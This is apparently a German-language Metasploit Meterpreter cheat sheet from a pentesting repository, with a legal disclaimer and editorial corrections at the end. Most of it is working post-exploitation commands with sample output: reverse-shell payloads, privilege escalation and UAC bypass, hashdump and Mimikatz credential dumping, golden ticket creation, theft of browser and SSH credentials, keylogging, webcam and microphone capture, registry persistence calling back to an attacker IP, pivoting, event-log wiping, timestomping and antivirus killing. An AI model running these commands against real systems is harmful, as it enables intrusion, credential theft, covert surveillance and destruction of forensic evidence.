# 🎭 Meterpreter – vollständiger Spickzettel

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post Exploitation](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **Das umfassende Werkzeug für Aktionen nach dem Erstzugang** - Ein umfassender Werkzeugkasten nach erlangtem Zugang

---

## 📋 Inhaltsverzeichnis

- [Was ist Meterpreter?](#-was-ist-meterpreter)
- [Kernbefehle](#-kernbefehle)
- [Systeminformationen](#-systeminformationen)
- [Dateisystembefehle](#-dateisystembefehle)
- [Netzwerkbefehle](#-netzwerkbefehle)
- [Prozessbefehle](#-prozessbefehle)
- [Benutzer- und Berechtigungsbefehle](#-benutzer--und-berechtigungsbefehle)
- [Passwörter und Zugangsdaten sammeln](#-passwörter-und-zugangsdaten-sammeln)
- [Keylogging](#-keylogging)
- [Bildschirmaufnahmen und Webcam](#-bildschirmaufnahmen-und-webcam)
- [Persistenz](#-persistenz)
- [Pivoting und Portweiterleitung](#-pivoting-und-portweiterleitung)
- [Anti-Forensik](#-anti-forensik)
- [Skripte und Automatisierung](#-skripte-und-automatisierung)
- [Tabelle zum Nachschlagen](#-tabelle-zum-nachschlagen)
- [Tipps und Tricks](#-tipps-und-tricks)

---

## 🎯 Was ist Meterpreter?

**Meterpreter** (Meta-Interpreter) ist eine fortgeschrittene, dynamisch erweiterbare Payload. Die Vorlage beschreibt die Variante mit DLL-Injektion im Arbeitsspeicher und Kommunikation über die Verbindung des Stagers.

### Wichtige Eigenschaften

| Eigenschaft | Beschreibung |
|---------|-------------|
| **Ausführung im Arbeitsspeicher** | Läuft laut Vorlage vollständig im RAM und hinterlässt wenige Spuren |
| **Verschlüsselte Kommunikation** | TLS-verschlüsselter Kanal zum C2-Server laut Vorlage |
| **Erweiterbar** | Erweiterungen zur Laufzeit laden |
| **Plattformübergreifend** | Windows, Linux, macOS, Android, PHP, Java |
| **Pivoting-fähig** | Datenverkehr über kompromittierte Hosts leiten |

### Meterpreter-Varianten

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a name="-kernbefehle"></a>

## ⌨️ Kernbefehle

### Hilfe und Navigation

```bash
# Alle Befehle anzeigen
meterpreter > help

# Hilfe zu einem bestimmten Befehl anzeigen
meterpreter > help upload

# Kanalinformationen anzeigen
meterpreter > channel -l
```

### Sitzungsverwaltung

```bash
# Sitzungsinformationen abrufen
meterpreter > info

# Aktuelle Sitzung in den Hintergrund legen
meterpreter > background
meterpreter > bg

# Zu msfconsole zurückkehren
meterpreter > exit

# Sitzung vollständig beenden
meterpreter > quit

# Nach einem Verbindungsabbruch erneut verbinden
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### Kanaloperationen

```bash
# Aktive Kanäle auflisten
meterpreter > channel -l

# Mit einem Kanal interagieren
meterpreter > channel -i <id>

# Aus einem Kanal lesen
meterpreter > channel -r <id>

# In einen Kanal schreiben
meterpreter > channel -w <id>

# Kanal schließen
meterpreter > channel -c <id>
```

---

## 💻 Systeminformationen

### Grundlegende Systeminformationen

```bash
# Systeminformationen abrufen
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Aktuellen Benutzer ermitteln
meterpreter > getuid
Server username: WIN-PC\Administrator

# Aktuelle Prozess-ID ermitteln
meterpreter > getpid
Current pid: 1234

# Prozessnamen ermitteln
meterpreter > getpname

# Prüfen, ob die Umgebung eine virtuelle Maschine ist
meterpreter > run post/windows/gather/checkvm
```

### Umgebungsvariablen und Registry

```bash
# Umgebungsvariablen auflisten
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Umgebungsvariable setzen
meterpreter > setenv VAR value

# Registry-Operationen (Windows)
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### Installierte Software und Patches

```bash
# Installierte Anwendungen auflisten
meterpreter > run post/windows/gather/enum_applications

# Installierte Patches und Hotfixes auflisten
meterpreter > run post/windows/gather/enum_patches

# Nach Dienstpfaden ohne Anführungszeichen suchen
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

## 📁 Dateisystembefehle

### Navigation

```bash
# Arbeitsverzeichnis anzeigen
meterpreter > pwd
C:\Users\Administrator\Desktop

# Verzeichnisinhalt auflisten
meterpreter > ls
meterpreter > ls -la

# Verzeichnis wechseln
meterpreter > cd C:\\Users
meterpreter > cd ..

# Aktuelles lokales Verzeichnis anzeigen
meterpreter > lpwd

# Lokales Verzeichnis wechseln
meterpreter > lcd /tmp

# Lokales Verzeichnis auflisten
meterpreter > lls
```

### Dateioperationen

```bash
# Dateiinhalt lesen
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Datei bearbeiten
meterpreter > edit C:\\file.txt

# Datei löschen
meterpreter > rm C:\\temp\\malware.exe

# Verzeichnis erstellen
meterpreter > mkdir C:\\temp\\hidden

# Verzeichnis entfernen
meterpreter > rmdir C:\\temp\\hidden

# Datei kopieren
meterpreter > cp source.txt destination.txt

# Datei verschieben oder umbenennen
meterpreter > mv oldname.txt newname.txt
```

### Dateiübertragung

```bash
# Datei vom Ziel herunterladen
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Rekursiv herunterladen
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Datei auf das Ziel hochladen
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Fortschritt beim Herunter- oder Hochladen anzeigen
meterpreter > download -p C:\\large_file.zip
```

### Dateisuche

```bash
# Nach Dateien suchen
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Auf allen Laufwerken nach einer bestimmten Dateiendung suchen
meterpreter > search -f *.kdbx

# Nach bestimmten Dateinamensmustern suchen
meterpreter > search -f *password* -r
```

### Datei-Hashes und Zeitstempel

```bash
# Dateiprüfsumme ermitteln
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Zeitstempel ändern (Timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

## 🌐 Netzwerkbefehle

### Netzwerkinformationen

```bash
# Netzwerkschnittstellen ermitteln
meterpreter > ipconfig
meterpreter > ifconfig

# Routingtabelle abrufen
meterpreter > route

# ARP-Cache abrufen
meterpreter > arp

# Aktive Netzwerkverbindungen ermitteln
meterpreter > netstat
```

### Portweiterleitung

```bash
# Lokalen Port an das entfernte Ziel weiterleiten
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Portweiterleitungen auflisten
meterpreter > portfwd list

# Portweiterleitung löschen
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Alle Portweiterleitungen entfernen
meterpreter > portfwd flush

# Beispiel: RDP weiterleiten
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Jetzt verbinden: rdesktop 127.0.0.1:3389
```

### DNS- und Netzwerkwerkzeuge

```bash
# Hostnamen auflösen
meterpreter > resolve google.com

# Proxy-Einstellungen ermitteln
meterpreter > run post/windows/gather/enum_proxy
```

---

<a name="-prozessbefehle"></a>

## ⚙️ Prozessbefehle

### Prozesse auflisten

```bash
# Alle Prozesse auflisten
meterpreter > ps

# Prozesse filtern
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Informationen zum aktuellen Prozess abrufen
meterpreter > getpid
```

### Prozesse beeinflussen

```bash
# In einen anderen Prozess migrieren
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Einen Prozess beenden
meterpreter > kill <PID>

# Befehl ausführen und Ausgabe abrufen
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Im Hintergrund ausführen
meterpreter > execute -f notepad.exe -H

# Mit kanalbasierter Ein- und Ausgabe ausführen
meterpreter > execute -f cmd.exe -c -i
```

### Hinweise zur Prozessmigration

```bash
# Laut Vorlage geeignete Migrationsziele (Windows)
# - explorer.exe (Benutzerkontext, stabil)
# - svchost.exe (SYSTEM, mehrere Instanzen)
# - lsass.exe (SYSTEM, laut Vorlage für hashdump erforderlich)

# explorer.exe suchen und dorthin migrieren
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Automatisch in einen stabilen Prozess migrieren
meterpreter > run post/windows/manage/migrate
```

---

## 👤 Benutzer- und Berechtigungsbefehle

### Informationen zum aktuellen Benutzer

```bash
# Aktuellen Benutzer ermitteln
meterpreter > getuid
Server username: WIN-PC\Administrator

# Aktuelle Berechtigungen ermitteln
meterpreter > getprivs

# Auf erhöhte Rechte prüfen (Windows)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### Rechteausweitung

```bash
# Versuchen, SYSTEM-Rechte zu erlangen
meterpreter > getsystem
meterpreter > getsystem -t 1  # Identitätsannahme über Named Pipes (im Arbeitsspeicher/Administrator)
meterpreter > getsystem -t 2  # Identitätsannahme über Named Pipes (Dropper/Administrator)
meterpreter > getsystem -t 3  # Token-Duplizierung (im Arbeitsspeicher/Administrator)

# UAC-Umgehung (aus msfconsole)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Vorschläge für lokale Exploits
meterpreter > run post/multi/recon/local_exploit_suggester

# Token eines anderen Prozesses übernehmen
meterpreter > steal_token <PID>

# Übernommenes Token ablegen
meterpreter > drop_token

# Benutzeridentität annehmen
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Verfügbare Tokens auflisten
meterpreter > use incognito
meterpreter > list_tokens -u
```

### Benutzer-Enumeration

```bash
# Lokale Benutzer auflisten
meterpreter > run post/windows/gather/enum_logged_on_users

# Domänenbenutzer auflisten (bei Domänenmitgliedschaft)
meterpreter > run post/windows/gather/enum_domain_users

# Lokale Gruppen auflisten
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

## 🔐 Passwörter und Zugangsdaten sammeln

### Hashes auslesen

```bash
# Passwort-Hashes auslesen (setzt laut Vorlage SYSTEM voraus)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Falls hashdump fehlschlägt, Folgendes versuchen
meterpreter > run post/windows/gather/smart_hashdump
```

### Mimikatz-/Kiwi-Erweiterung

```bash
# Kiwi (Mimikatz) laden
meterpreter > load kiwi

# Alle Zugangsdaten abrufen
meterpreter > creds_all

# Passwort aus dem Arbeitsspeicher abrufen
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Kerberos-Tickets auslesen
meterpreter > kiwi_cmd sekurlsa::tickets

# WLAN-Passwörter ermitteln
meterpreter > kiwi_cmd misc::wifi

# LSA-Daten auslesen
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Golden Ticket
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### Zugangsdaten sammeln

```bash
# In Dateien nach Zugangsdaten suchen
meterpreter > run post/multi/gather/credentials/generic

# Zugangsdaten aus Browsern
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# SSH-Schlüssel
meterpreter > run post/multi/gather/ssh_creds

# Windows Credential Manager
meterpreter > run post/windows/gather/enum_cred_store

# Outlook-Zugangsdaten
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a name="-keylogging"></a>

## ⌨️ Keylogging

### Keylogger starten und stoppen

```bash
# Keylogger starten
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Erfasste Tastatureingaben ausgeben
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Keylogger stoppen
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### Erweitertes Keylogging

```bash
# Keylogger als eigenen Prozess ausführen
meterpreter > run post/windows/capture/keylog_recorder

# In einen Prozess mit Tastaturzugriff migrieren (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

## 📸 Bildschirmaufnahmen und Webcam

### Bildschirmaufnahmen

```bash
# Einzelne Bildschirmaufnahme erstellen
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Bildschirmaufnahme mit eigenem Dateipfad erstellen
meterpreter > screenshot -p /tmp/screen.jpg

# Fortlaufende Bildschirmaufnahmen
meterpreter > run post/multi/gather/screen_spy

# Desktop in Echtzeit anzeigen
meterpreter > screenshare
```

### Webcam-Operationen

```bash
# Webcams auflisten
meterpreter > webcam_list
1: Integrated Webcam

# Webcam-Aufnahme erstellen
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Aufnahme mit Optionen erstellen
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Webcam in Echtzeit streamen
meterpreter > webcam_stream
```

### Audioaufnahme

```bash
# Mikrofon aufnehmen
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Mit festgelegter Dauer aufnehmen
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

## 🔄 Persistenz

### Windows-Persistenz

```bash
# Persistenz über die Registry
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Persistenz über geplante Aufgaben
meterpreter > run post/windows/manage/persistence_exe

# Persistenz über einen Dienst
meterpreter > run metsvc

# Persistenz über WMI
meterpreter > run post/windows/manage/wmi_persistence
```

### Optionen der Persistenz erläutert

```bash
# Optionen des persistence-Skripts
-A        # Passenden Handler automatisch starten
-L <path> # Speicherort für die Payload
-P <path> # Zu verwendende Payload
-S        # Als Dienst starten (mit SYSTEM-Rechten)
-T        # Alternative EXE-Vorlage
-U        # Bei der Benutzeranmeldung starten
-X        # Beim Systemstart starten
-i <sec>  # Zeitabstand zwischen Verbindungsversuchen
-p <port> # Zielport für die Payload-Verbindung
-r <ip>   # Ziel-IP-Adresse für die Payload-Verbindung
```

### Persistenz entfernen

```bash
# Persistenzmechanismen auflisten
meterpreter > run post/windows/gather/enum_persistence

# Persistenz entfernen (manuell)
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

## 🔀 Pivoting und Portweiterleitung

### Routenverwaltung

```bash
# Route über eine Sitzung hinzufügen
meterpreter > run autoroute -s 10.10.10.0/24

# Routen anzeigen
meterpreter > run autoroute -p

# Route löschen
meterpreter > run autoroute -d -s 10.10.10.0/24

# Aus msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### SOCKS-Proxy

```bash
# SOCKS-Proxy starten (aus msfconsole)
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# proxychains konfigurieren
# /etc/proxychains.conf bearbeiten:
# socks4 127.0.0.1 1080

# Mit proxychains verwenden
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### Beispiele für Portweiterleitungen

```bash
# Lokalen Port an einen internen Host weiterleiten
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Umgekehrte Portweiterleitung
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Beispielszenarien:
# Auf internen Webserver zugreifen
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Auf internes RDP zugreifen
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Auf internes SMB zugreifen
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

## 🧹 Anti-Forensik

### Spuren entfernen

```bash
# Windows-Ereignisprotokolle leeren
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Dateizeitstempel mit Timestomp ändern
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### Techniken zur Umgehung der Erkennung

```bash
# In einen legitimen Prozess migrieren
meterpreter > migrate -N svchost.exe

# Auf Überwachung prüfen
meterpreter > run post/windows/gather/enum_av

# Virenschutz deaktivieren (riskant)
meterpreter > run post/windows/manage/killav

# Prozess verbergen
meterpreter > run post/windows/manage/inject_host
```

---

## 📜 Skripte und Automatisierung

### Resource-Skripte

```bash
# Resource-Skript erstellen
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Resource-Skript ausführen
meterpreter > resource post_exploit.rc
```

### Häufige Skripte

```bash
# System-Enumeration
meterpreter > run scraper

# Alle Informationen sammeln
meterpreter > run winenum

# Auf virtuelle Maschinen prüfen
meterpreter > run checkvm

# Lokale Subnetze für Pivoting ermitteln
meterpreter > run get_local_subnets

# Plattformübergreifende Erkundung
meterpreter > run post/multi/recon/local_exploit_suggester
```

### IRB-Shell (Ruby)

```bash
# IRB-Modus aufrufen
meterpreter > irb

# Beispiel: Dateien auflisten
>> client.fs.dir.entries("C:\\")

# Beispiel: Datei lesen
>> client.fs.file.open("C:\\secret.txt").read

# IRB verlassen
>> exit
```

---

## 📊 Tabelle zum Nachschlagen

### Wichtige Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `sysinfo` | Systeminformationen |
| `getuid` | Aktueller Benutzer |
| `getpid` | Aktuelle Prozess-ID |
| `ps` | Prozesse auflisten |
| `migrate <PID>` | In einen anderen Prozess wechseln |
| `getsystem` | Rechte auf SYSTEM erweitern |
| `hashdump` | Passwort-Hashes auslesen |
| `shell` | System-Shell öffnen |
| `upload <src> <dst>` | Datei hochladen |
| `download <src>` | Datei herunterladen |
| `screenshot` | Bildschirm aufnehmen |
| `webcam_snap` | Webcam-Aufnahme |
| `keyscan_start` | Keylogger starten |
| `keyscan_dump` | Tastatureingaben abrufen |

### Dateioperationen

| Befehl | Beschreibung |
|---------|-------------|
| `pwd` | Arbeitsverzeichnis anzeigen |
| `cd <dir>` | Verzeichnis wechseln |
| `ls` | Dateien auflisten |
| `cat <file>` | Datei lesen |
| `edit <file>` | Datei bearbeiten |
| `rm <file>` | Datei löschen |
| `mkdir <dir>` | Verzeichnis erstellen |
| `search -f <pattern>` | Dateien suchen |

### Netzwerkoperationen

| Befehl | Beschreibung |
|---------|-------------|
| `ipconfig` | Netzwerkschnittstellen |
| `route` | Routingtabelle |
| `netstat` | Aktive Verbindungen |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Port weiterleiten |
| `run autoroute -s <subnet>` | Route für Pivoting hinzufügen |

### Rechteausweitung

| Befehl | Beschreibung |
|---------|-------------|
| `getsystem` | SYSTEM-Rechte erlangen |
| `getprivs` | Aktuelle Berechtigungen auflisten |
| `steal_token <PID>` | Token eines Prozesses übernehmen |
| `load incognito` | Incognito-Erweiterung laden |
| `list_tokens -u` | Verfügbare Tokens auflisten |
| `impersonate_token` | Benutzertoken zur Identitätsannahme verwenden |

### Zugangsdaten sammeln

| Befehl | Beschreibung |
|---------|-------------|
| `hashdump` | SAM-Hashes auslesen |
| `load kiwi` | Mimikatz laden |
| `creds_all` | Alle Zugangsdaten |
| `lsa_dump_sam` | LSA-SAM-Daten auslesen |
| `kiwi_cmd <cmd>` | Mimikatz-Befehl ausführen |

---

## 💡 Tipps und Tricks

### Bewährte Vorgehensweisen

1. **Laut Vorlage zuerst migrieren**
   ```bash
   # Vor weiteren Aktionen in einen stabilen Prozess migrieren
   meterpreter > migrate -N explorer.exe
   ```

2. **Sitzungen in den Hintergrund legen**
   ```bash
   # Sitzungen nicht schließen, sondern in den Hintergrund legen
   meterpreter > background
   ```

3. **Verschlüsselte Payloads verwenden**
   ```bash
   # HTTPS-Payloads bevorzugen
   windows/meterpreter/reverse_https
   ```

4. **Vor dem Handeln prüfen**
   ```bash
   # Berechtigungen immer prüfen
   meterpreter > getuid
   meterpreter > getprivs
   ```

### Fehlerbehebung

| Problem | Lösung |
|-------|----------|
| Sitzung bricht ab | In einen stabilen Prozess migrieren |
| hashdump schlägt fehl | Zuerst SYSTEM-Rechte erlangen mit `getsystem` |
| getsystem schlägt fehl | Andere Technik versuchen `-t 1,2,3` |
| Keylogger liefert keine Eingaben | In explorer.exe migrieren |
| Zeitüberschreitung bei Befehlen | Netzwerkverbindung prüfen |

### Hinweise zur Vermeidung einer Erkennung

```bash
# 1. Aus dem ursprünglichen Prozess herausmigrieren
meterpreter > migrate -N svchost.exe

# 2. Spuren entfernen
meterpreter > clearev

# 3. Timestomp auf hochgeladene Dateien anwenden
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. Abgelegte Dateien nach Abschluss löschen
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠️ Rechtlicher Hinweis

> **WARNUNG:** Dieser Spickzettel dient ausschließlich Lernzwecken und autorisierten Penetrationstests. Unbefugter Zugriff auf Computersysteme ist rechtswidrig. Vor Tests immer eine angemessene Genehmigung einholen.

---

## 📚 Weiterführende Ressourcen

- [Leitfaden zum Metasploit Framework](./README.de.md)
- [Offensive-Security-Dokumentation](https://www.offensive-security.com/)
- [Rapid7-Metasploit-Dokumentation](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Aktionen nach dem Erstzugang sicher beherrschen!</b><br>
  <i>Mit Meterpreter beginnt die eigentliche Arbeit nach dem Erstzugang</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Architektur und Spuren:** DLL-Injektion beschreibt vor allem die native Windows-Variante, nicht sämtliche Meterpreter-Implementierungen. Speicherbasierte Ausführung bedeutet nicht Spurenfreiheit. Transport und Verschlüsselung sind getrennt zu betrachten; nicht jede Meterpreter-Verbindung verwendet TLS. Unterstützte Befehle hängen von Plattform, Erweiterungen und Version ab. [Rapid7: Meterpreter-Architektur](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html), [Rapid7: Transportsteuerung](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html).

> **Rechte und Prozessmigration:** `getsystem` versucht eine Rechteausweitung und ist kein reiner Test auf bereits erhöhte Rechte. Die drei gezeigten Techniknummern sind keine vollständige aktuelle Liste. Eine Migration ist weder grundsätzlich der erste Schritt noch pauschal sicher; Zugriffsrechte, Architektur und Schutzmechanismen entscheiden über die Voraussetzungen. Eine Migration in `lsass.exe` ist keine allgemeine Voraussetzung für jeden Hash-Dump. [Rapid7: getsystem-Implementierung](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/elevate.rb).

> **Historische Befehle:** Meterpreter-Skripte wie `persistence`, `metsvc`, `autoroute`, `winenum` und `scraper` sind Legacy-Beispiele. Das Projekt pflegt beziehungsweise akzeptiert solche Skripte nicht mehr und verweist auf Post-Module; konkrete Verfügbarkeit muss gegen die installierte Version geprüft werden. Im Original steht `impersonate_token` einmal vor dem Laden von Incognito; der Befehl setzt die entsprechende Erweiterung voraus. [Rapid7: Skript-Deprecation](https://docs.metasploit.com/api/Msf/RPC/RPC_Session.html#rpc_meterpreter_script-instance_method).

> **Statische Syntaxprüfung:** In der geprüften aktuellen Dateisystem-Implementierung sind für `checksum` MD5 und SHA1 aufgeführt, nicht SHA256; `download -p` ist dort keine dokumentierte Fortschrittsoption. Die Originalzeilen bleiben unverändert. Die gezeigte `ps | grep`-Zeile ist keine allgemein unterstützte Unix-Pipeline im Meterpreter-Interpreter. `clearev` löscht Ereignisprotokolle; es macht Aktivitäten nicht unsichtbar und ersetzt keine abgestimmte Bereinigung. [Rapid7: Dateisystembefehle](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb).
